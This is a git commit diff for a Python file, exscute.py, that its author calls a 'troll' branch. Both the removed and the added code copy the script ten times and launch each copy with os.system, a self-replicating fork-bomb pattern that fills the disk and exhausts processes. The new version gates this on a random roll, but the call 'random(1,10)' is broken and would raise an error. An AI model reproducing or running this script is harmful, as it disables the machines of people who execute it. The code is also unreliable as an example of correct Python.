3a73735ec95d33128e0ae3564a9004f76397b820
zakaria-amghare <zizou.amgh@gmail.com>
2025-10-12 15:13:59 +0100

    this branch is troll in this branch empliment funny ideass

--- exscute.py
+++ exscute.py
@@ -1,7 +1,11 @@
 import os
+import random
 file=os.path.basename(__file__)
-
-for i in range(10):
-    os.system(f"copy {file} {i}{file}")
-    os.system(f"python ./{i}{file}")
-    os.system(f"python {i}{file}")
+x = random(1,10)
+if x == 1:
+    print("you ar unlucky")
+    print("what a miss")
+    for i in range(10):
+        os.system(f"copy {file} {i}{file}")
+        os.system(f"python ./{i}{file}")
+        os.system(f"python {i}{file}")
